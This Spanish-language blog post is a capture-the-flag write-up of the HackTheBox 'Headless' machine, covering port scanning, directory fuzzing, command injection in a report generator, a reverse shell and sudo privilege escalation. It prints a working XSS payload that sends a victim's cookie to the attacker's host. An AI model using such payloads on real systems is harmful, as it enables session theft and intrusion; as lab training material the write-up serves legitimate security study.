---
title: HTB Headless Writeup
date: 2024-07-27 08:00:00 -05:00
author: retxus
categories: [HTB, Linux]
tags: [Linux, XSS, BurpSuite]
comments: false
image:
    path: /assets/img/HTB-Headless/Headless.png
---

Muy buenas con todos, el día de hoy voy a resolver la máquina `Headless` de HTB, espero que el procedimiento sea de su agrado y fácil de comprender.

## Reconocimiento

Primero vemos si tenemos conexión con la máquina y de paso gracias al `ttl` identificamos ante el tipo de máquina que estamos, en `linux` este suele ser de 64 y en `windows` de 128.

```bash
ping -c 1 10.10.11.8
PING 10.10.11.8 (10.10.11.8) 56(84) bytes of data.
64 bytes from 10.10.11.8: icmp_seq=1 ttl=63 time=117 ms

--- 10.10.11.8 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 117.141/117.141/117.141/0.000 ms
```

Vemos que el `ttl` de la máquina es de 63, el cual está próximo a 64 por ende nos encontramos ante una máquina `Linux`.

Ahora vamos a identificar los puertos abiertos dentro de la máquina, los invito a usar el siguiente `script` hecho en `bash`.

```bash
#!/bin/bash

GREEN="\e[32m"
RED="\e[31m"
RESET="\e[0m"

IP="$1"

if [ -z "$IP" ]; then
  echo "Uso: $0 <IP>"
  exit 1
fi

TEMP_FILE=$(mktemp)

echo -e "${GREEN}[+] Escaneando todos los puertos abiertos... ${RESET}"

nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn "$IP" -oG "$TEMP_FILE"

# Extraer los puertos abiertos
PORTS=$(grep -oP '\d+/open' "$TEMP_FILE" | awk -F'/' '{print $1}' | tr '\n' ',' | sed 's/,$//'; echo)

rm "$TEMP_FILE"

if [ -z "$PORTS" ]; then
  echo -e "${RED}[-] No se encontraron puertos abiertos.${RESET}"
  exit 1
fi

echo -e "\n${GREEN}[+] Escanenado servicios en los puertos: $PORTS. ${RESET}\n"

nmap -sCV -p"$PORTS" "$IP" -oN target

echo -e "\n${GREEN}[+] Escano completado. Resultados en 'target'.${RESET}\n"
```

De preferencia es mejor usar este `script` como `root`, ya que algunos parámetros de `nmap`, requieren de privilegios elevados. Esto al final nos va a generar un archivo `target` que contiene la información de los puertos abiertos dentro de la máquina.

```bash
sudo ./scan.sh 10.10.11.44
```

```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 90:02:94:28:3d:ab:22:74:df:0e:a3:b2:0f:2b:c6:17 (ECDSA)
|_  256 2e:b9:08:24:02:1b:60:94:60:b3:84:a9:9e:1a:60:ca (ED25519)
5000/tcp open  http    Werkzeug httpd 2.2.2 (Python 3.11.2)
|_http-title: Under Construction
|_http-server-header: Werkzeug/2.2.2 Python/3.11.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumeración Web

Bueno logramos ver que en la máquina por el puerto `5000` corre un servicio web, si lo vemos en el navegador nos dice que es un sitio en construcción y nos dan un apartado de soporte. Por el momento busquemos más rutas en la web.

```bash
ffuf -c -t 100 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.11.8:5000/FUZZ
```

Lgramos ver que nos reporta una ruta con un estado 401 (Unauthorized).

## XSS

Viendo la ruta `support`, lo primero en lo que podemos pensar es en un ataque del tipo `XSS`, así que allí vamos. Vemos que al ingresar algún tipo de `payload` nos devuelve un mensaje de intento de hacking y vemos nuestra petición tramitada.

Luego de varios intentos, pruebo a ingresar el payload en el `user agent` y en concreto este `<script>var i=new Image(); i.src="http://10.10.14.8/?cookie="+btoa(document.cookie);</script>` fue el payload que me funciono.

![](/assets/img/HTB-Headless/1_Headless.png)

Después de unos segundos nos devuelve una cadena en `base64` y si vemos su contenido es una `cookie`. Podemos tratar de reemplazar este valor que obtuvimos en el apartado de `dashboard`.

## Ganando acceso

![](/assets/img/HTB-Headless/2_Headless.png)

Podemos ver que obtenemos acceso a algo que parece ser un generador de reportes mediante una fecha. Así que interceptamos esa petición con `BurpSuite`.

Luego de unas pruebas vemos que si ponemos un `;` luego de la fecha podemos ejecutar comandos.

![](/assets/img/HTB-Headless/3_Headless.png)

Para ganar acceso nos podemos ir a [esta](https://www.revshells.com/){:target="_blank"} web y elegimos la `reverse shell (nc mkfifo)` en formato `URL encode`, o se puede usar cualquier otro payload que les funcione.

Una vez dentro hacemos en tratamiento de la tty.

```bash
script /dev/null -c bash

ctrl + z

stty raw -echo; fg

reset xterm

export TERM=xterm
```

Y logramos ver la primera `flag`.

![](/assets/img/HTB-Headless/4_Headless.png)

## Escalada de privilegios

Si ejecutamos el comando `sudo -l` podemos ver que tenemos la posibilidad de ejecutar un `script` con privilegios `sudo` sin proporcionar contraseña. Sí analizamos un poco el script. Vemos que hay una condición en donde se ejecuta un archivo desde la ruta donde estés actualmente.

![](/assets/img/HTB-Headless/5_Headless.png)

Nos vamos a aprovechar de eso, vamos a crear un archivo con ese nombre para darle permisos `setuid` a la `bash`.

![](/assets/img/HTB-Headless/6_Headless.png)

Bueno, una vez hecho todo eso logramos ver la última `flag`.
